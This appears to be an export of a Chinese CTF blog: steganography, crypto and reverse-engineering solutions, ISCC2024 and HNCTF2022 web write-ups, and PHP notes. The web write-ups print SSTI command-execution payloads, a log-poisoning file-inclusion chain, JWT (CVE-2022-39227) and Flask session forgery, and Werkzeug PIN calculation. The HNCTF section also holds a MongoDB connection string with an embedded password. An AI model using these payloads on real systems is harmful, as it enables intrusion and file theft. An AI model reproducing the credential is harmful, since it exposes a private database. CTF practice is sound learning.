[{"title":"MISC-刷题之旅","path":"/2024/05/02/misc-shua-ti-zhi-lu/","content":"CTF-Show MISC入门 图片篇(基础操作) MISC1 打开即是flag MISC2 010打开发现是PNG文件头，修改后缀看看 打开即是flag 记录一下常见文件头 JPEG (jpg) 文件头：FF D8 FF 文件尾：FF D9 PNG (png)，文件头：89504E47 Windows Bitmap (bmp)， 文件头：424D 文件尾： GIF (gif)，文件头：47494638 XML (xml)，文件头：3C3F786D6C HTML (html)，文件头：68746D6C3E MS Word/Excel (xls.or.doc)，文件头：D0CF11E0 MS Access (mdb)，文件头：5374616E64617264204A Adobe Acrobat (pdf)，文件头：255044462D312E Windows Password (pwl)，文件头：E3828596 ZIP Archive (zip)，文件头：504B0304 RAR Archive (rar)，文件头：52617221 Wave (wav)，文件头：57415645 AVI (avi)，文件头：41564920 TIFF (tif)， 文件头：49492A00 文件尾： MISC3 是个bpg文件后缀，没见过，不会，看wp。 下载下来里面是一个BPG 的格式文件 需要用能打开软件的工具：https://bellard.org/bpg/ 下载之后，输入如下图所示的命令，即可得到flag MISC4 得到6个文件，010打开，根据文件头更改对应的格式即可，就最后一个是一个webp后缀，需要费点时间才能找到，可以直接看下图的文件内容发现有RIFF……WEBP，或者就是文件头16进制 修改完依次打开拼接就是flag ctfshow{4314e2b15ad9a960e7d9d8fc2ff902da} 图片篇(信息附加) MISC5 图片是假的，010打开搜flag即可 MISC6 同上一关 MISC7 依旧同上关 MISC8 这需要仔细观察，可以在010看到有两个PNG 说明一个图片中含有两个图片的意思，看了wp，分离的话采用foremost或者binwalk，我直接kali了，如下图也能看到有两个图片 这里使用foremost比较方便，如下图，查看png目录下的图片即可 ctfshow{1df0a9a3f709a2605803664b55783687} MISC9 又是直接打开得到flag MISC10 binwalk分析得到其中含有zip，-e选项可以提取已知的文件类型 发现在得到的结果中，直接得到了flag MISC11 不会，看wp是与IDAT块有关，如下图可以看到存在两个IDAT块，学习一下概念： IDAT定义： 图像数据块IDAT(image data chunk)：它存储实际的数据，在数据流中可包含多个连续顺序的图像数据块。 IDAT存放着图像真正的数据信息，因此，如果能够了解IDAT的结构，用户就可以很方便的生成PNG图像。 一般的IDAT隐写会体现在IDAT块的长度上，会有一些IDAT块有异常的长度，那么就是解题的关键。 IDAT有固定的长度，正常的PNG图片只有最后一个IDAT块的长度是比其他的要短的。 PNG图片格式介绍：MISC之图像处理 这道题感觉也不是关于IDAT之类的处理，只是单纯让我们理解这是个什么，有什么作用的意思 . 这里用工具打开，发现存在两个IDAT块，根据我们的图片，第一个显示的是fake flag 图像数据块 IDAT（image data chunk）：它存储实际的数据，在数据流中可包含多个连续顺序的图像数据块。这是一个可以存在多个数据块类型的数据块。它的作用就是存储着图像真正的数据。IDAT采用 LZ77 算法的派生算法进行压缩，可以用 zlib 解压缩。值得注意的是，IDAT 块只有当上一个块充满时，才会继续一个新的块。 这里说IDAT包含多个连续的数据块，存储图像真正的数据，因此我们可以尝试删除这些IDAT块，来看看图片有什么变化，如这道题删除第一个就显示了flag，也就是第二个IDAT块的图像数据，可以说是第一个IDAT块覆盖了第二个 ctfshow{44620176948fa759d3eeafeac99f1ce9} MISC12 首先我这里看了一下发现存在很多IDAT块，以为有什么问题呢，用TweakPNG看了一眼 看不出来啥，没规律似乎，于是看wp了，发现都用了一个PNGDebugger，学习一番：工具 PNG Debugger 的安装使用 可以看到都显示CRC校验没问题，于是照着上一关的思路，把IDAT块都删了，尝试一下，发现当删除完第八个之后，显示了flag ctfshow{10ea26425dd4708f7da7a13c8e256a73} MISC13 这道题考察的有点不确定，大致我认为是考察IEND块的，看如下介绍 图像结束数据 IEND（image trailer chunk）：它用来标记 PNG 文件或者数据流已经结束，并且必须要放在文件的尾部。IEND 数据块的长度总是 00 00 00 00，数据标识总是 IEND 49 45 4E 44，因此，CRC 码也总是 AE 42 60 82。 那我们对比现在的文件 发现是02结尾，意思是IEND数据块长度不是0，说明该图片结尾部分还存在着某些数据，那我们仔细观察 可以看到这里存在ctfshow等的字样，根据wp我们需要找函数：作用是让每两位16进制字符转换为一个ASCII或者是被称作16进制对象。这里还是看一下关于此函数的介绍： bytes.fromhex() 是一个内置函数，用于从十六进制字符串创建字节串（bytes）对象。 fromhex() 方法接受一个十六进制字符串作为输入，并将其转换为对应的字节串。输入的十六进制字符串可以包含数字 0-9 和小写字母 a-f（或大写字母 A-F）。 那思路明确了，提取上述16进制字符，利用该函数转换为对应的字节串，上脚本即可 result = '' payload = \"631A74B96685738668AA6F4B77B07B216114655336A5655433346578612534DD38EF66AB35103195381F628237BA6545347C3254647E373A64E465F136FA66F5341E3107321D665438F1333239E9616C7D94\" s = bytes.fromhex(payload) print(s) for i in range(0, len(s), 2): result += chr(s[i]) print(result) #ctfshow{ae6e3ea48f518b7e42d7de6f412f839a} MISC14 搜了多个文章，大致理解这题的思路了。 首先binwalk分析图片，并尝试提取其中的图片，但如下图，虽然显示出信息了，但并没有直接提取到图片（原因不清楚），根据wp，采用的Linux dd命令分离得到其中的jpeg 命令如下：因为jpeg是从2103开始的，因此也就得skip跳过2103个块 dd if=misc14.jpg of=flag.jpeg skip=2103 bs=1 查看即可得到flag ctfshow{ce520f767fc465b0787cdb936363e694} MISC15 直接搜索即可 MISC16 这里尝试了一下之前的办法，利用binwalk提取了一下，直接找到flag MISC17 https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240326165921211.png","tags":["MISC"],"categories":["MISC"]},{"path":"/2024/05/01/iscc2024-wp/","content":"WEB-还没想好名字的塔防游戏 审计源代码，发现三条提示信息 结合提示说flag有18位，以及下面的标题，猜测首字母，拿到flag（真脑洞） flag：ISCC{MDWTSGTMMCCSITTDWS} WEB-Flask中的pin值计算 从题目得知，就是找相关信息，计算PIN码即可。 源码看到base64编码，解一下出来：/getusername 访问看到回声海螺AI模型，网上能找到西湖论剑有过这种题目，加上这里组件含有flask，等等可以想到SSTI注入，这里试了很多payload 有用的就下面这个 {{get_flashed_messages.__globals__['current_app'].config}} {{request.application.__self__._get_data_for_json.__globals__['json'].JSONEncode r.default.__globals__['current_app'].config['username']}} 得到下一个路由 让我们一秒内计算出结果，很明显得写脚本 import json import re #正则模块 import requests s = requests.Session() url1 = 'http://101.200.138.180:10006/get_expression' url2 = 'http://101.200.138.180:10006/crawler' r = s.get(url1) r.encoding = 'utf-8' r = json.loads(r.text) #修改编码 print(r) expression = r['expression'] expression = re.sub(r'×', '*', expression) result = eval(expression) print(result) res = s.get(url2, params={\"answer\":result}) print(res.text) 计算出结果会显示我们当前的app绝对路径，同时又得到了一个路由，继续访问 看源码发现存在jwt，同时上面的style属性给了一个值ISCC_muyu_2024，猜测是key，尝试一下 eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJuYW1lIjoiZG9uYXRlIiwicXVhbnRpdHkiOjF9.gT7yG_zYb22iGVXcGtSVzYr-fAeb_Nyv4KbeH3Ez8hc 这里的payload是个donate以及1，加上题目回显功德不足，尝试把name改为cost：花费。同时quantity（有功德的意思）改为很大的数字 发现成功，内容如下 佛曰：功德圆满。地址02:42:ac:18:00:02:,机器码提示给你了/machine_id 这里能拿到vip会员奖品，但是对于supervip没有权限，肯定又是jwt的相关伪造了 看到这里感觉就是CVE-2022-39227，直接找文章复现即可 from datetime import timedelta from json import loads, dumps from test.common import generated_keys from test import python_jwt as jwt from pyvows import Vows, expect from jwcrypto.common import base64url_decode, base64url_encode def topic(self, topic): \"\"\" Use mix of JSON and compact format to insert forged claims including long expiration \"\"\" [header, payload, signature] = topic.split('.') parsed_payload = loads(base64url_decode(payload)) parsed_payload[\"role\"]='vip' print(dumps(parsed_payload, separators=(',', ':'))) fake_payload = base64url_encode((dumps(parsed_payload, separators=(',', ':')))) return '{\" ' + header + '.' + fake_payload + '.\":\"\",\"protected\":\"' + header + '\", \"payload\":\"' + payload + '\",\"signature\":\"' + signature + '\"}' {\"eyJhbGciOiJQUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE3MTQ2MjUzNDYsImlhdCI6MTcxNDYyMTc0NiwianRpIjoiUjJhQnd3bXA2SHVaOWM1R3BwMkF1USIsIm5iZiI6MTcxNDYyMTc0Niwicm9sZSI6InZpcCIsInVzZXJuYW1lIjoiSVNDQ21lbWJlciJ9.\":\"\",\"protected\":\"eyJhbGciOiJQUzI1NiIsInR5cCI6IkpXVCJ9\",\"payload\":\"eyJleHAiOjE3MTQ2MjUzNDYsImlhdCI6MTcxNDYyMTc0NiwianRpIjoiUjJhQnd3bXA2SHVaOWM1R3BwMkF1USIsIm5iZiI6MTcxNDYyMTc0Niwicm9sZSI6Im1lbWJlciIsInVzZXJuYW1lIjoiSVNDQ21lbWJlciJ9\",\"signature\":\"BBWtpJpu0dZekxBUL9vScuSRhLTBokcoQw_0l9Q8H_zb16vzIRglrSzkKjmTJNYO0eKdxOCc2YGUj4R4Morr1WN9MfRsxM06iqGiOc39_Qs9MzQuRZ6TvIhm6ivZZNGE9AiDfiBJzq-B2e_xMMMrq1c8FhTIArjd5oknKu_38g_Wx0OBZdABZ7T4o7CGunzHLYO6TnLO8go4IyKLM_frIIF6i02yGJQd4WEb6pFYKhNjd1wLoYd_eE4jdmlcfLFeXX8eL8LXyx2_eJtHYz0z3odaVdpcEZt4BJubbhcDkyjzbsLQD7nLLVQ1ZIlvUvDRthm2PlFgSlcLnIuKBPEtxg\"} 得到结果之后，抓vip的包，因为这里含有token参数，我们可以对照supervip的包 发现这里只有session，猜测就是session伪造，那首先就得获得key，猜测就是上述jwt漏洞所得到的key，如下图，welcome猜测是key，伪造即可 发现我们当前只是个vip，那肯定是要改成supervip的 python3 flasksession.py encode -s 'welcome_to_iscc_club' -t '{\"role\":\"supervip\"}' 然后找个# werkzeug2.0.x ⾼版本算pin脚本 算出来/console 填写就有flag username：pincalculate modname：flask.app appname：crawler app.py：/usr/local/lib/python3.11/site-packages/flask/app.py uuidnode mac：2485378351106 machine_id：acff8a1c-6825-4b9b-b8e1-8983ce1a8b94 PWN-chaos MISC-Number_is_the_key EXCEL打开，缩放，全选ctrl+F全局替换（粗体替换为黑） 调整大小以及列宽为：2即可 手机扫描即可得到flag MISC-FunZip zip打开，如下图，一眼感觉就是各种base编码，puzzle工具梭哈即可 得到flag MISC-精装四合一 REVERSE-迷失之门 无壳64位，ida打开，全局搜索字符串，发现下面的flag 双击跟随 发现下面的代码，数字转换为ASCII码提取出来看看 得到完整数组：a1=FSBBhKMMZKWMetQOhawDCcCmem6，接着回到之前，分析逻辑 也就是mian函数的check 编写脚本即可 v16 = \"ABCDEFGHIJKLMNOPQRSTUVWXYZ\" v10 = \"abcdefghijklmnopqrstuvwxyz\" v4 = \"0123456789+/-=!#&amp;*()?;:^%\" v3 = \"DABBZXQESVFRWNGTHYJUMKIOLPC\" flag = [] a1 = \"FSBBhKMMZKWMetQOhawDCcCmem6\" for i in a1: if i in v16: flag.append(v16.index(i)) elif i in v10: flag.append(v10.index(i) + 26) elif i in v4: flag.append(v4.index(i) + 52) for i in range(len(flag)): print(chr(ord(v3[i]) + flag[i]), end=\"\") print() 得到flag"},{"title":"HNCTF2022","path":"/2024/04/30/hnctf-2022/","content":"Week1-Interesting_include mongodb+srv://hybcx:Fusijun233386@hybcx.9qnehsn.mongodb.net/?retryWrites=true&amp;w=majority&amp;appName=hybcx &lt;?php //WEB手要懂得搜索 //flag in ./flag.php if(isset($_GET['filter'])){ $file = $_GET['filter']; if(!preg_match(\"/flag/i\", $file)){ die(\"error\"); } include($file); }else{ highlight_file(__FILE__); } 正常输入flag.php不可，尝试伪协议成功 Week1-2048 找到alert位置，猜测是flag，放到控制台输出即可 Week1-easy_html 信息搜集一手，发现敏感目录，访问一下 说是手机号登陆，随便输了一下，发现最大长度限制为10，那肯定不符合手机号位数，尝试bp抓包一下修改，如下图，成功 Week1-What is Web 源码找到flag Week1-Interesting_http 简单的http协议，没啥说的 Week1-easy_upload 文件上传无过滤 WEEK2-ez_SSTI 无过滤SSTI，payload如下· {{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('id').read() }} {{ self._TemplateReference__context.joiner.__init__.__globals__.os.popen('id').read() }} {{ self._TemplateReference__context.namespace.__init__.__globals__.os.popen('id').read() }} # Or in the shotest versions: {{ cycler.__init__.__globals__.os.popen('id').read() }} {{ joiner.__init__.__globals__.os.popen('id').read() }} {{ namespace.__init__.__globals__.os.popen('id').read() }} 参考文章 Server Side Template Injection SSTI (Server Side Template Injection) WEEK2-easy_include &lt;?php //WEB手要懂得搜索 if(isset($_GET['file'])){ $file = $_GET['file']; if(preg_match(\"/php|flag|data|\\~|\\!|\\@|\\#|\\\\$|\\%|\\^|\\&amp;|\\*|\\(|\\)|\\-|\\_|\\+|\\=/i\", $file)){ die(\"error\"); } include($file); }else{ highlight_file(__FILE__); } 看到这里过滤的挺严，我感觉不能绕过，加上题目提示要搜索，想着搜集一手文件上传getshell，发现日志文件包含getshell可能性大，且该站点也是nginx，直接尝试遍历配置文件 ?file=../../../../etc/nginx/nginx.conf //发现错误日志文件，也就能猜解出访问日志文件路径 ?file=../../../../var/log/nginx/access.log //发现可以访问 毫无疑问就是日志文件getshell，直接bp访问一手（这样的话，代码不会被编码） 接着访问access.log，命令执行即可1=system('cat /ffflllaaaggg'); 参考文章 文件包含漏洞的应用与绕过技巧、防御方法 WEEK2-ez_ssrf &lt;?php highlight_file(__FILE__); error_reporting(0); $data=base64_decode($_GET['data']); $host=$_GET['host']; $port=$_GET['port']; $fp=fsockopen($host,intval($port),$error,$errstr,30); if(!$fp) { die(); } else { fwrite($fp,$data); while(!feof($data)) { echo fgets($fp,128); } fclose($fp); }","tags":["CTF赛事"],"categories":["CTF赛事"]},{"path":"/2024/04/27/di-shi-wu-jie-quan-qian-bei-wp/","content":"个人信息 个人名称：付思钧 个人排名：80 题目一:爬虫协议 解题思路 题目提示直接访问robots.txt，然后得到目录名，访问最下面的，得到flag 继续访问 FLAG flag{98c1ab60-b715-4eab-b3cc-e78981de120d} 题目二：packet 解题思路 wireshark直接抓包，选择追踪TCP流，如上图，发现base64编码，解码得到flag FLAG flag{7d6f17a4-2b0a-467d-8a42-66750368c249} 题目三：cc 解题思路 根据给的样本，直接选择左侧aes 解密，然后复制对应的key，选择input为hex，output为raw FLAG flag{6500e76e-15fb-42e8-8f29-a309ab73ba38} 题目四:Theorem 解题思路 根据提示：模运算在密码学中是一种常见的加密手段，而中国剩余定理则提供了一种解密的方法。小蓝同学运用这个定理来获得c，进而获得了flag。 经典题型：已知e、p、q、密文c，求明文m（可直接上脚本，之前做过） from Crypto.Util.number import * from gmpy2 import * flag = b'xxx' m = bytes_to_long(flag) p = getPrime(512) q = next_prime(p) e = 65537 n = p * q phi = (p - 1) * (q - 1) d = inverse(e, phi) d1 = d % q d2 = d % p c = pow(m, e, n) print(n) print(d1) print(d2) print(c) # 94581028682900113123648734937784634645486813867065294159875516514520556881461611966096883566806571691879115766917833117123695776131443081658364855087575006641022211136751071900710589699171982563753011439999297865781908255529833932820965169382130385236359802696280004495552191520878864368741633686036192501791 # 4218387668018915625720266396593862419917073471510522718205354605765842130260156168132376152403329034145938741283222306099114824746204800218811277063324566 # 9600627113582853774131075212313403348273644858279673841760714353580493485117716382652419880115319186763984899736188607228846934836782353387850747253170850 # 36423517465893675519815622861961872192784685202298519340922692662559402449554596309518386263035128551037586034375613936036935256444185038640625700728791201299960866688949056632874866621825012134973285965672502404517179243752689740766636653543223559495428281042737266438408338914031484466542505299050233075829 根据剩余定理，写py脚本 from Crypto.Util.number import long_to_bytes,inverse#导入相关包 from sympy import primefactors # 题目给的相关加密数据 n = 94581028682900113123648734937784634645486813867065294159875516514520556881461611966096883566806571691879115766917833117123695776131443081658364855087575006641022211136751071900710589699171982563753011439999297865781908255529833932820965169382130385236359802696280004495552191520878864368741633686036192501791 e = 65537 c = 36423517465893675519815622861961872192784685202298519340922692662559402449554596309518386263035128551037586034375613936036935256444185038640625700728791201299960866688949056632874866621825012134973285965672502404517179243752689740766636653543223559495428281042737266438408338914031484466542505299050233075829 factors = primefactors(n) p,q = factors[0], factors[1] phi = (p-1) * (q-1) d = inverse(e, phi) # 进行解密 m = pow(c,d,n) #转换为字节形式 flag = long_to_bytes(m) print(flag) 拿到flag FLAG flag{5f00e1b9-2933-42ad-b4e1-069f6aa98e9a} 题目五:signature 解题思路 根据题目给的附件：椭圆曲线数字签名算法，它利用椭圆曲线密码学（ECC）对数字签名算法（DSA）进行模拟，其安全性基于椭圆曲线离散对数问题。但是当某些数值相同时会出现一些安全问题。 import ecdsa import random def ecdsa_test(dA,k): sk = ecdsa.SigningKey.from_secret_exponent( secexp=dA, curve=ecdsa.SECP256k1 ) sig1 = sk.sign(data=b'Hi.', k=k).hex() sig2 = sk.sign(data=b'hello.', k=k).hex() r1 = int(sig1[:64], 16) s1 = int(sig1[64:], 16) s2 = int(sig2[64:], 16) return r1,s1,s2 if __name__ == '__main__': n = 0xfffffffffffffffffffffffffffffffebaaedce6af48a03bbfd25e8cd0364141 a = random.randint(0,n) flag = 'flag{' + str(a) + \"}\" b = random.randint(0,n) print(ecdsa_test(a,b)) # (4690192503304946823926998585663150874421527890534303129755098666293734606680, 111157363347893999914897601390136910031659525525419989250638426589503279490788, 74486305819584508240056247318325239805160339288252987178597122489325719901254) ecdsa_test函数接受两个参数：dA（私钥）和 k（随机数）。 使用给定的dA私钥和SECP256k1曲线创建了一个签名密钥sk。 使用密钥sk对消息 b'Hi.' 和 b'hello.' 进行签名，并将签名结果转换为十六进制字符串。 从签名字符串中提取出 r 和 s 值，分别是签名的一部分。 返回 r1、s1 和 s2。 该代码使用ECDSA对消息进行签名。它生成一个随机的私钥 a 和随机数 b，然后使用私钥对消息进行签名，并提取签名的 r 和 s 值。最后，它将 r1、s1 和 s2 打印出来。 根据上述脚本，可轻易写出下列exp from Crypto.Util.number import * from hashlib import * import gmpy2 #定义椭圆曲线的模数 n，和参数 a 和 b。 n = 0xfffffffffffffffffffffffffffffffebaaedce6af48a03bbfd25e8cd0364141 a = 0 b = 7 #定义消息和已知签名： m1 = b\"Hi.\" m2 = b\"hello.\" r1, s1, s2 = ( 4690192503304946823926998585663150874421527890534303129755098666293734606680, 111157363347893999914897601390136910031659525525419989250638426589503279490788, 74486305819584508240056247318325239805160339288252987178597122489325719901254 ) #使用SHA-1哈希算法计算消息 m1 和 m2 的哈希值，并将其转换为长整数。 test1 = bytes_to_long(sha1(m1).digest()) test2 = bytes_to_long(sha1(m2).digest()) testk = gmpy2.invert((s1 - s2), n) * (test1 - test2) %n testr = gmpy2.invert(r1, n) resultd = ((testk * s1) - test1) * testr % n print('flag{'+str(resultd) + '}') 计算 k 值，通过求解 (s1 - s2) * k ≡ (test1 - test2) (mod n) 的模反元素。 计算 r 的模反元素 testr。 使用公式 resultd = ((k * s1) - test1) * testr mod n 还原私钥。 FLAG flag{40355055231406097504270940121798355439363616832290875140843417522164091270174} 题目六:rc4 解题思路 根据提示：RC4是一种流加密算法，密钥长度可变，它加解密使用相同的密钥，因此也属于对称加密算法。 看出该RC4加密没有魔改，正常打即可 打开附件发现是exe，ida打开（思路感觉是找到RC4加密密文即可），32位ida打开 可以看出上述gamelab@为秘钥key，在main函数下断点，进入，动态dump得到v5 本地开动调 找到上述位置，点击进去 如上图，找到RC4密文，上cyberchef进行RC4解密即可，输入对应秘钥转明文得到flag FLAG flag{12601b2b-2f1e-468a-ae43-92391ff76ef3} 题目七：缺失的数据 解题思路 根据题目给的附件，其中压缩包需要密码才行，同时给了secret.txt，其中包含压缩包密码，直接上工具爆破 密码为：pavilion 根据这两个图片，确定为图片盲水印 继续看题目给的加密脚本 class WaterMarkDWT: def __init__(self, origin: str, watermark: str, key: int, weight: list): self.key = key self.img = cv2.imread(origin) self.mark = cv2.imread(watermark) self.coef = weight def arnold(self, img): r, c = img.shape p = np.zeros((r, c), np.uint8) a, b = 1, 1 for k in range(self.key): for i in range(r): for j in range(c): x = (i + b * j) % r y = (a * i + (a * b + 1) * j) % c p[x, y] = img[i, j] return p def deArnold(self, img): r, c = img.shape p = np.zeros((r, c), np.uint8) a, b = 1, 1 for k in range(self.key): for i in range(r): for j in range(c): x = ((a * b + 1) * i - b * j) % r y = (-a * i + j) % c p[x, y] = img[i, j] return p def get(self, size: tuple = (1200, 1200), flag: int = None): img = cv2.resize(self.img, size) img1 = cv2.cvtColor(img, cv2.COLOR_RGB2GRAY) img2 = cv2.cvtColor(self.mark, cv2.COLOR_RGB2GRAY) c = pywt.wavedec2(img2, 'db2', level=3) [cl, (cH3, cV3, cD3), (cH2, cV2, cD2), (cH1, cV1, cD1)] = c d = pywt.wavedec2(img1, 'db2', level=3) [dl, (dH3, dV3, dD3), (dH2, dV2, dD2), (dH1, dV1, dD1)] = d a1, a2, a3, a4 = self.coef ca1 = (cl - dl) * a1 ch1 = (cH3 - dH3) * a2 cv1 = (cV3 - dV3) * a3 cd1 = (cD3 - dD3) * a4 waterImg = pywt.waverec2([ca1, (ch1, cv1, cd1)], 'db2') waterImg = np.array(waterImg, np.uint8) waterImg = self.deArnold(waterImg) kernel = np.ones((3, 3), np.uint8) if flag == 0: waterImg = cv2.erode(waterImg, kernel) elif flag == 1: waterImg = cv2.dilate(waterImg, kernel) cv2.imwrite('水印.png', waterImg) return waterImg if __name__ == '__main__': img = 'a.png' k = 20 xs = [0.2, 0.2, 0.5, 0.4] W1 = WaterMarkDWT(img, waterImg, k, xs) 分析得到上面的功能是在图片上添加水印 origin：原始图像的文件路径。 watermark：水印图像的文件路径。 key：Arnold变换的迭代次数。 weight：水印嵌入的系数列表。 定义Arnold逆变换函数：实现细节为 deArnold(self, img)函数实现Arnold逆变换，对传入的图像img进行逆变换。它返回逆变换后的图像。 与arnold()函数类似，首先获取图像的行数r和列数c，创建一个全零的图像p用于存储逆变换结果。 使用相同的参数a和b来控制逆变换的迭代次数和变换公式。 在两层循环中，根据Arnold逆变换的公式计算逆变换后的像素位置(x, y)，并将变换后的图像中的像素值赋给逆变换后的位置。 循环结束后，返回逆变换后的图像5. 定义获取水印图像的函数： 之后，将得到的两个图片使用SUB方式叠加，写对应解密脚本：exp如下 import cv2#导入需要的库 import numpy as np import pywt class WaterMarkDWT: #WaterMarkDWT类接受四个参数：origin（原始图像文件的路径），watermark（水印图像文件的路径），key（Arnold变换的迭代次数），weight（用于修改小波系数的四个系数的列表）。 def __init__(self, origin: str, watermark: str, key: int, weight: list): #构造函数初始化密钥，使用OpenCV的imread函数读取原始图像和水印图像，并存储权重系数。 self.key = key self.img = cv2.imread(origin) self.mark = cv2.imread(watermark) self.coef = weight def arnold(self, img):#arnold函数对给定的图像img应用Arnold变换，进行key次迭代。 r, c = img.shape p = np.zeros((r, c), np.uint8) a, b = 1, 1 for k in range(self.key):#deArnold函数对给定的图像img应用逆Arnold变换，进行key次迭代。 for i in range(r): for j in range(c): x = (i + b * j) % r y = (a * i + (a * b + 1) * j) % c p[x, y] = img[i, j] return p def deArnold(self, img):# r, c = img.shape p = np.zeros((r, c), np.uint8) a, b = 1, 1 for k in range(self.key): for i in range(r): for j in range(c): x = ((a * b + 1) * i - b * j) % r y = (-a * i + j) % c p[x, y] = img[i, j] return p #使用DWT提取水印： def get(self, size: tuple = (1200, 1200), flag: int = None): img = cv2.resize(self.img, size) img1 = cv2.cvtColor(img, cv2.COLOR_RGB2GRAY) img2 = cv2.cvtColor(self.mark, cv2.COLOR_RGB2GRAY) c = pywt.wavedec2(img2, 'db2', level=3) [cl, (cH3, cV3, cD3), (cH2, cV2, cD2), (cH1, cV1, cD1)] = c d = pywt.wavedec2(img1, 'db2', level=3) [dl, (dH3, dV3, dD3), (dH2, dV2, dD2), (dH1, dV1, dD1)] = d #四个权重系数（a1，a2，a3，a4）用于修改小波系数。 a1, a2, a3, a4 = self.coef ca1 = (cl - dl) * a1 ch1 = (cH3 - dH3) * a2 cv1 = (cV3 - dV3) * a3 cd1 = (cD3 - dD3) * a4 # 确保所有系数具有相同的形状 ca1 = cv2.resize(ca1, (cD3.shape[1], cD3.shape[0])) waterImg = pywt.waverec2([ca1, (ch1, cv1, cd1)], 'db2') waterImg = np.array(waterImg, np.uint8) waterImg = self.deArnold(waterImg) kernel = np.ones((3, 3), np.uint8) #根据flag参数的值，使用OpenCV的erode或dilate函数对提取的水印图像进行腐蚀或膨胀操作。 if flag == 0: waterImg = cv2.erode(waterImg, kernel) elif flag == 1: waterImg = cv2.dilate(waterImg, kernel) return waterImg if __name__ == '__main__': img = 'a.png' # 原始图像文件名 watermark = 'newImg.png' # 嵌入了水印的图像文件名 k = 20 # 密钥 xs = [0.2, 0.2, 0.5, 0.4] # 权重列表 # 创建 WaterMarkDWT 对象 W1 = WaterMarkDWT(img, watermark, k, xs) # 提取水印 extracted_watermark = W1.get() # 可以将提取出的水印保存为文件，或者进行进一步的处理 cv2.imwrite('提取出的水印.png', extracted_watermark) 运行得到flag FLAG flag{e642820a-44c0-4c7d-a259-68b15aca8840}"},{"title":"PHP学习总结","path":"/2024/04/23/php-xue-xi-zong-jie/","content":"0x01 PHP基础知识 关于这一块儿，当初在菜鸟也学习过，这里也不想在赘述，可以说是懒吧，就记录一些我认为重点的 思路主要还是先了解，能简单实践就实践，到了代码审计的时候，在遇到什么解决什么 PHP 运行命令 $ php hello.php 变量 Variables $boolean1 = true; $boolean2 = True; $int = 12; $float = 3.1415926; unset($float); // 删除变量 $str1 = \"How are you?\"; $str2 = 'Fine, thanks'; 字符串 Strings $url = \"jaywcjlove.github.io\"; echo \"I'm learning PHP at $url\"; // 连接字符串 echo \"I'm learning PHP at \" . $url; $hello = \"Hello, \"; $hello .= \"World!\"; echo $hello; # =&gt; Hello, World! 包含 Include &lt;?php include 'vars.php'; echo $fruit . \" \"; # =&gt; apple /* 与 include 相同， 如果不能包含则导致错误*/ require 'vars.php'; // 也有效 include('vars.php'); require('vars.php'); // 通过 HTTP 包含 include 'http://x.com/file.php'; // 包含和返回语句 $result = include 'vars.php'; echo $result; # =&gt; Anything you like. ?&gt; 整数 Integer $int1 = 28; # =&gt; 28 $int2 = -32; # =&gt; -32 $int3 = 012; # =&gt; 10 (octal) $int4 = 0x0F; # =&gt; 15 (hex) $int5 = 0b101; # =&gt; 5 (binary) $int6 = 2_000_100_000; # =&gt; 2000100000 (decimal, PHP 7.4.0) 浮点数 Float $float1 = 1.234; $float2 = 1.2e7; $float3 = 7E-10; $float4 = 1_234.567; // as of PHP 7.4.0 var_dump($float4); // float(1234.567) $float5 = 1 + \"10.5\"; # =&gt; 11.5 $float6 = 1 + \"-1.3e3\"; # =&gt; -1299 Null $a = null; $b = 'Hello php!'; echo $a ?? 'a is unset'; # =&gt; a is unset echo $b ?? 'b is unset'; # =&gt; Hello php $a = array(); $a == null # =&gt; true $a === null # =&gt; false is_null($a) # =&gt; false 这里的??为空合并运算符 上述PHP代码是一个使用了空合并运算符（null coalescing operator）的表达式。该代码用于检查变量$a是否已设置，如果已设置则返回其值，如果未设置则返回字符串 'a is unset'。 空合并运算符 ?? 是在PHP 7中引入的。它的作用是判断左侧表达式的值是否为null，如果是null则返回右侧表达式的值，否则返回左侧表达式的值。 在上述代码中，$a ?? 'a is unset' 表达式会先判断变量$a的值是否为null。如果$a已设置且不为null，则整个表达式的结果为$a的值。如果$a未设置或为null，则整个表达式的结果为字符串 'a is unset'。 这样的代码可以用于提供默认值，当变量未设置时，可以返回一个预定义的值，以避免使用未定义的变量而引发错误。 多行 Multi-line $str = \"foo\"; // 未插值的多行 $nowdoc = &lt;&lt;&lt;'END' Multi line string $str END; // 将执行字符串插值 $heredoc = &lt;&lt;&lt;END Multi line $str END; EOF用法，使用概述： 必须后接分号，否则编译通不过。 EOF 可以用任意其它字符代替，只需保证结束标识与开始标识一致。 结束标识必须顶格独自占一行(即必须从行首开始，前后不能衔接任何空白和字符)。 开始标识可以不带引号或带单双引号，不带引号与带双引号效果一致，解释内嵌的变量和转义符号，带单引号则不解释内嵌的变量和转义符号。 当内容需要内嵌引号（单引号或双引号）时，不需要加转义符，本身对单双引号转义，此处相当与q和qq的用法。 操作 Manipulation $s = \"Hello Phper\"; echo strlen($s); # =&gt; 11 echo substr($s, 0, 3); # =&gt; Hel echo substr($s, 1); # =&gt; ello Phper echo substr($s, -4, 3);# =&gt; hpe echo strtoupper($s); # =&gt; HELLO PHPER echo strtolower($s); # =&gt; hello phper echo strpos($s, \"l\"); # =&gt; 2 var_dump(strpos($s, \"L\")); # =&gt; false 混合 int 和 string 键 $array = array( \"foo\" =&gt; \"bar\", \"bar\" =&gt; \"foo\", 100 =&gt; -100, -100 =&gt; 100, ); var_dump($array); 短数组语法 $array = [ \"foo\" =&gt; \"bar\", \"bar\" =&gt; \"foo\", ]; 操作 $arr = array(5 =&gt; 1, 12 =&gt; 2); $arr[] = 56; // 附加 $arr[\"x\"] = 42; // 用键添加 sort($arr); // 排序 unset($arr[5]); // 消除 unset($arr); // 移除所有 串联阵列 $a = [1, 2]; $b = [3, 4]; // PHP 7.4 以后 # =&gt; [1, 2, 3, 4] $result = [...$a, ...$b]; 在PHP 7.4及以后的版本中，$result = [...$a, ...$b]; 这段代码使用了展开运算符（spread operator）来将两个数组 $a 和 $b 的元素合并到一个新的数组 $result 中。 展开运算符 ... 可以将数组拆分为独立的元素，并在数组字面量或函数调用中使用。在这个例子中，[...$a, ...$b] 表达式将会展开数组 $a 和 $b 的元素，并将它们合并到一个新的数组中。 下面是一个示例来说明这段代码的含义： $a = [1, 2, 3]; $b = [4, 5, 6]; $result = [...$a, ...$b]; print_r($result); 输出结果： Array ( [0] =&gt; 1 [1] =&gt; 2 [2] =&gt; 3 [3] =&gt; 4 [4] =&gt; 5 [5] =&gt; 6 ) 在上述示例中，$a 